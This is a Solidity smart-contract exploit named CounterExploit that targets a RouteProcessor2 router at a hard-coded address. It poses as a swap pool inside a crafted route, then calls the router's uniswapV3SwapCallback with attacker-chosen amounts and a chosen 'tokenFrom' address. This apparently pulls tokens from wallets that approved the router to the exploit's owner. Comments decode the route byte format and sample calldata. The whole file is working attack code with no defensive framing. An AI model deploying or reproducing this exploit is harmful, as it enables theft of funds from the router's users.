// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface RouteProcessor2 {
    function processRoute(
        address tokenIn,
        uint256 amountIn,
        address tokenOut,
        uint256 amountOutMin,
        address to,
        bytes memory route
    ) external payable returns (uint256 amountOut);
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external;
}

interface Token {
    function approve(address spender, uint256 amount) external returns (bool);
}

contract CounterExploit {
    address owner;
    int256 tI;
    int256 tO;
    address tiA;
    address tiF;
    RouteProcessor2 internal RP = RouteProcessor2(0x044b75f554b886A065b9567891e45c79542d7357);

    constructor() {
        owner = msg.sender;
    }

    function exploit(
        int256 tokenInAmount,
        int256 tokenOutAmount,
        address tokenIn,
        address tokenFrom
    ) external {
        require(msg.sender == owner, "Not owner");
        tI = tokenInAmount;
        tO = tokenOutAmount;
        tiA = tokenIn;
        tiF = tokenFrom;
        // commandCode => 1
        // Token address
        // num => 1?
        // poolType => 1
        // share
        // pool address
        // zeroForOne ==> bool
        // recipient => address
        // 0x01 514910771af9ca656af840dff83e8264ecf986ca 01 0000 01 000000c0524f353223d94fb76efab586a2ff8664 00 0000000000000000000000000000000000000000
        // 0x01 (command code)
        // 514910771af9ca656af840dff83e8264ecf986ca (token address)
        // 01 (num)
        // 0000 (share)
        // 01 (poolType)
        // 000000c0524f353223d94fb76efab586a2ff8664 (pool address)
        // 00 (zeroForOne)
        // 0000000000000000000000000000000000000000 (recipient)

        uint8 commandCode = 1;
        address token = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
        uint8 num = 1;
        uint16 share = 0;
        uint8 poolType = 1;
        address pool = address(this);
        bool zeroForOne = false;
        address recipient = 0x0000000000000000000000000000000000000000;

        bytes memory data = abi.encodePacked(
            commandCode,
            token,
            num,
            share,
            poolType,
            pool,
            zeroForOne,
            recipient
        );

        RP.processRoute(
            0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE,
            0,
            0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE,
            0,
            0x0000000000000000000000000000000000000000,
            data
        );
    }

    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1) {
        // Data => 0x000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000000000000000031d3243cfb54b34fc9c73e1cb1137124bd6b13e1
        RP.uniswapV3SwapCallback(
            tI,
            tO,
            // address tokenIn
            // address tokenFrom
            // 0x000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000000000000000031d3243cfb54b34fc9c73e1cb1137124bd6b13e1
            abi.encode(tiA, tiF)
        );

        return (tI, tO);
    }

    function approve(address token, uint256 amount) external {
        require(msg.sender == owner);
        Token(token).approve(msg.sender, amount);
    }
}
